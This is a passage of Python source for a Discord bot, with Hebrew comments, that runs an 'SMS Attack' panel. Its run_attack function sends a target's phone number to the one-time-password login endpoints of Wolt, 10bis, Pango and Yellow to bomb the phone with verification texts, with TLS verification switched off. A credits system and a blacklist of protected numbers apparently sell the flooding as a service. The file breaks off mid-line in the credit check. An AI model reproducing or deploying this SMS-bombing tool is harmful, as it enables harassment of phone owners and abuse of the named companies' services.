import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio, datetime
from flask import Flask
from threading import Thread

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
def keep_alive():
    Thread(target=run).start()

# --- הגדרות אבטחה ולוגים ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
MY_USER_ID = 1499077731659284540 # ה-ID שלך
LOG_CHANNEL_ID = 1499510962296721568
DB_FILE = "database.json"

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f:
        try: return json.load(f)
        except: return {"credits": {}, "blacklist": []}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

async def send_log(bot, title, description, color=discord.Color.blue()):
    try:
        # fetch_channel מבטיח שהבוט ימצא את הערוץ גם אם הוא לא ב-cache
        channel = await bot.fetch_channel(LOG_CHANNEL_ID)
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        await channel.send(embed=embed)
    except Exception as e:
        print(f"Log Error: {e}")

# --- מנוע שליחה ---
async def run_attack(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    success, failed = 0, 0
    targets = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    # verify=False פותר את שגיאת ה-SSL handshake שראינו בלוגים
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        for t in targets:
            try:
                resp = await client.post(t["url"], json=t["json"], headers=headers)
                if 200 <= resp.status_code < 300: success += 1
                else: failed += 1
            except: failed += 1
    return success, failed

# --- ממשק פאנל ---
class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    async def on_submit(self, interaction: discord.Interaction):
        data = get_data()
        uid = str(interaction.user.id)
        is_admin = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME) or interaction.user.id == MY_USER_ID
        
        if self.phone.value in data["blacklist"]:
            return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)
        
        user_bal = data["credits"].get(uid, 0)
        # בדיקת קרדיטים/לייפטיים (999,99
